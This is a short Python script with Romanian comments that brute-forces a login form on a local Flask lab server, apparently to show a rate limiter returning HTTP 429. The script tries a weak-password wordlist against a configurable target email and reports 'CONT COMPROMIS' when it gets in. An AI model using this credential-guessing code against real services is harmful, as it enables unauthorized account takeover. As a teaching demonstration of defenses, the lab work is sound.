import requests
import time

# 1. Configurația țintei (Mediul tău local de laborator)
URL = "http://127.0.0.1:5000/login"
TARGET_EMAIL = "admin@authx.ro" # Schimbă cu email-ul contului pe care îl ataci

# 2. Dicționarul de parole (Wordlist)
# Presupunem că victima are o parolă slabă (ex: "123")
WORDLIST = [
    "admin123",
    "password",
    "123",
    "pass1",
    "pass123",
    "1234",
    "password1",
    "password123",
    "qwerty",
    "123456",
    "123",       
    "parolamea",
    "iloveyou"
]

def run_brute_force():
    print(f"[*] Începem atacul automat asupra contului: {TARGET_EMAIL}")
    print(f"[*] URL Țintă: {URL}\n")
    
    # Este necesar să menținem o sesiune HTTP pentru a păstra cookie-urile
    session = requests.Session()

    for password in WORDLIST:
        print(f"[-] Testez parola: {password} ... ", end="")
        
        # Datele care simulează completarea formularului HTML
        payload = {
            "email": TARGET_EMAIL,
            "password": password
        }

        try:
            # Trimitem cererea de POST către server
            # allow_redirects=False ne ajută să capturăm exact momentul când serverul ne trimite către dashboard (succes)
            response = session.post(URL, data=payload, allow_redirects=False)

            # Verificăm cum a reacționat serverul:
            
            # CAZ 1: Succes (v1 și v2 dacă ghicește din prima) - Serverul face redirect (302) către /dashboard
            if response.status_code == 302 and '/dashboard' in response.headers.get('Location', ''):
                print("SUCCES!")
                print(f"\n[!!!] CONT COMPROMIS: Parola corectă este '{password}'")
                break
                
            # CAZ 2: Blocat de Rate Limiter (Doar în v2) - Cod HTTP 429 Too Many Requests
            elif response.status_code == 429:
                print("BLOCAT!")
                print(f"\n[X] ATAC OPRIT: Serverul a returnat HTTP 429 (Too Many Requests).")
                print("    Rate Limiter-ul a intervenit!")
                break
                
            # CAZ 3: Parolă greșită, continuăm
            else:
                print("Eșuat.")
                
            # Un mic delay ca să vezi cum rulează (în realitate hackerii nu pun delay, ci rulează sute de request-uri pe secundă)
            time.sleep(0.5)

        except requests.exceptions.RequestException as e:
            print(f"\n[!] Eroare de conexiune: Ai pornit serverul Flask? ({e})")
            break

if __name__ == "__main__":
    run_brute_force()